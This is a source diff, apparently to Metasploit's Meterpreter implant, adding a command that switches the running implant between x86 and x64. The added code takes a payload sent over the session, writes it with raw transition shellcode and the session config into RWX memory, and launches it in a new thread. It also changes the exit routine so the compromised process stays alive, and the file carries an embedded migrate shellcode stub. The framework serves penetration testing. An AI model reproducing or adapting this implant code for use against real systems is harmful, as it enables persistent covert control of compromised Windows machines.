@@ -2,6 +2,10 @@
 #include "base_inject.h"
 #include "../../../config.h"
 
+// Copied from the reflective loader, instead of including it.
+#define EXITFUNC_THREAD		0x0A2A1DE0
+#define EXITFUNC_PROCESS	0x56A2B5F0
+
 // see 'external/source/shellcode/windows/x86/src/migrate/migrate.asm'
 BYTE migrate_stub_x86[] =	"\xFC\x8B\x74\x24\x04\x81\xEC\x00\x20\x00\x00\xE8\x89\x00\x00\x00"
 							"\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52\x0C\x8B\x52\x14\x8B"
@@ -507,6 +511,128 @@ DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
 	}
 
 	return result;
+}
+
+/*!
+ * @brief Change the current mode of operation between x64 and x86 Meterpreter.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to the request packet.
+ * @param pResult Pointer to the memory that will receive the result.
+ * @returns Indication of whether the server should continue processing or not.
+ */
+BOOL remote_request_core_switch_arch(Remote * remote, Packet * packet, DWORD* pResult)
+{
+	Packet* response = NULL;
+	DWORD dwResult = ERROR_SUCCESS;
+	MetsrvConfig* config = NULL;
+	DWORD configSize = 0;
+
+	// Get the length of the payload buffer
+	DWORD dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_LEN);
+
+	// Receive the actual payload buffer
+	LPVOID lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);
+
+#ifdef _WIN64
+	dprintf("[SWITCH-ARCH] Attempting to switch arch from x64 -> x86. PayloadLength=%d", dwPayloadLength);
+	// we're in x64 mode and wanting to go to x86
+	// call $+5;mov dword [rsp+4], 0x23; add dword [rsp], 0xD;retf
+	BYTE transitionStub[] = "\xe8\x00\x00\x00\x00\xc7\x44\x24\x04\x23\x00\x00\x00\x83\x04\x24\x0d\x48\xcb";
+#else
+	dprintf("[SWITCH-ARCH] Attempting to switch arch from x86 -> x64. PayloadLength=%d", dwPayloadLength);
+	// we're in x86 mode and wanting to go to x64
+	// and esp, ~0xf;push 0x33;call $+5;add dword [esp], 5;retf;and rsp, ~0xf
+	BYTE transitionStub[] = { 0x83, 0xe4, 0xf0, 0x6a, 0x33, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x04, 0x24, 0x05, 0xcb, 0x48, 0xcc, 0x83, 0xe4, 0xf0 };
+
+#endif
+
+	BYTE socketCopy[] = { 0xbf, 0x00, 0x00, 0x00, 0x00 };
+
+	// get the existing configuration
+	dprintf("[SWITCH-ARCH] creating the configuration block");
+	remote->config_create(remote, &config, &configSize);
+	dprintf("[SWITCH-ARCH] Config of %u bytes stashed at 0x%p", configSize, config);
+
+	if (config->session.comms_fd)
+	{
+		socketCopy[1] = config->session.comms_fd & 0xFF;
+		socketCopy[2] = (config->session.comms_fd >> 8) & 0xFF;
+		socketCopy[3] = (config->session.comms_fd >> 16) & 0xFF;
+		socketCopy[4] = (config->session.comms_fd >> 24) & 0xFF;
+	}
+
+	DWORD requiredSize = dwPayloadLength + sizeof(transitionStub) + sizeof(socketCopy) + configSize;
+
+	do
+	{
+		response = packet_create_response(packet);
+		if (!response)
+		{
+			dwResult = ERROR_NOT_ENOUGH_MEMORY;
+			break;
+		}
+
+		dprintf("[SWITCH-ARCH] Allocating memory");
+		LPVOID lpMemory = VirtualAlloc(NULL, requiredSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpMemory)
+		{
+			BREAK_ON_ERROR("[SWITCH-ARCH] VirtualAllocEx failed")
+		}
+
+		// Write "stuff" to the target
+		dprintf("[SWITCH-ARCH] Writing payload");
+		LPBYTE csr = (LPBYTE)lpMemory;
+		memcpy(csr, transitionStub, sizeof(transitionStub));
+		csr += sizeof(transitionStub);
+		dprintf("[SWITCH-ARCH] Last byte of transitionStub: 0x%02x", *(csr - 1));
+		memcpy(csr, socketCopy, sizeof(socketCopy));
+		csr += sizeof(socketCopy);
+		dprintf("[SWITCH-ARCH] Last byte of socketCopy: 0x%02x", *(csr - 1));
+		memcpy(csr, lpPayloadBuffer, dwPayloadLength);
+		csr += dwPayloadLength;
+		dprintf("[SWITCH-ARCH] Last byte of lpPayloadBuffer: 0x%02x", *(csr - 1));
+		memcpy(csr, config, configSize);
+
+		// ready to rock, create a new thread!
+		dprintf("[SWITCH-ARCH] Creating thread");
+		//((void(*)())lpMemory)();
+		if (CreateThread(NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)lpMemory, NULL, 0, NULL) == NULL)
+		{
+			BREAK_ON_ERROR("[SWITCH-ARCH] Failed to create new Meterpreter thread");
+		}
+	} while (0);
+
+	SAFE_FREE(config);
+
+	if (response)
+	{
+		dprintf("[SWITCH-ARCH] Sending response");
+		packet_transmit_response(dwResult, remote, response);
+	}
+
+	if (pResult)
+	{
+		*pResult = dwResult;
+	}
+
+	if (dwResult == ERROR_SUCCESS)
+	{
+		// we need to make sure we don't kill the process off so patch the exit func
+		// to use threads instead of process if required
+		if (remote->orig_config->session.exit_func == EXITFUNC_PROCESS)
+		{
+			remote->orig_config->session.exit_func = EXITFUNC_THREAD;
+		}
+
+		if (remote->transport->type == METERPRETER_TRANSPORT_SSL)
+		{
+			((TcpTransportContext*)remote->transport->ctx)->fd = 0;
+		}
+		return FALSE;
+	}
+
+	// carry on
+	return TRUE;
 }
 
 /*!
